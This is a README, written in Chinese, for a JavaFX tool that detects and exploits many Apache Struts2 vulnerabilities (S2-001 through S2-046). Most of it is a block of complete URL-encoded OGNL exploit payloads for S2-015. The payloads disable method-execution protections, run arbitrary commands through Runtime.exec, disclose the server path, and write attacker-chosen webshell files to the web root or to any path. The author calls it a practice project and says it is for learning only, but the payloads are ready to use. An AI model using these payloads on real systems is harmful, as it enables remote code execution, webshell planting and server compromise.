# Struts2_Fx
struts2漏洞的检测、利用，javafx练手项目

支持这些"s001", "s005", "s007", "s008", "s009",
~~"s012"~~, "s013", "s015", "s016", "s019",
"sdev", "s032", "s037", "s045", "s046"编号漏洞的POC检测,PATH获取,EXP利用,根目录UPLOAD上传，指定目录USER_UPLOAD上传

例如015
```
  INFO015 = "[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; ";
  POC015 = "/$%7B" + r1 + "%2A" + r2 + "%7D.action";
  EXEC015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{EXEC}').getInputStream())%2C%23q%7D.action";
  PATH015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')%2C%23resp%3D%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23resp.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23resp.getWriter().println(%23req.getSession().getServletContext().getRealPath(%23parameters.pp%5B0%5D))%2C%23resp.getWriter().flush()%2C%23resp.getWriter().close()%7D.action?pp=%2f&encoding={ENCODE}";
  UPLOAD015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest()%2C%23res%3D@org.apache.struts2.ServletActionContext@getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2C%23path%3D%23req.getRealPath(%23parameters.pp%5B0%5D)%2Cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path+%23parameters.shellname%5B0%5D).append(%23parameters.shellContent%5B0%5D)).close()%2C%23w.print(%23parameters.content1%5B0%5D)%2C%23w.print(%23parameters.content2%5B0%5D)%2C%23w.close()%2C1%3f%23xx:%23request.toString%7D.action|shellname={FILENAME}&shellContent={FILECONTENT}&encoding={ENCODE}&pp=%2f&content1=UPLO&content2=AD-OK";
  USER_UPLOAD015 = "/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest()%2C%23res%3D@org.apache.struts2.ServletActionContext@getResponse()%2C%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D)%2C%23w%3D%23res.getWriter()%2Cnew%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.pp%5B0%5D).append(%23parameters.scontent%5B0%5D)).close()%2C%23w.print(%23parameters.content1%5B0%5D)%2C%23w.print(%23parameters.content2%5B0%5D)%2C%23w.close()%2C1%3f%23xx:%23request.toString%7D.action|scontent={FILECONTENT}&encoding={ENCODE}&pp={REALPATH}&content1=UPLO&content2=AD-OK";
```

ps.可能遇得到稍微多一点的就032，045，046，以及遇过极少数的009和016，本意只是JAVAFX练手以及复现一波struts2的洞

pss.用的一台windows云主机进行测试的，所以有些payload对linux下的环境并不适用，仅供学习吧
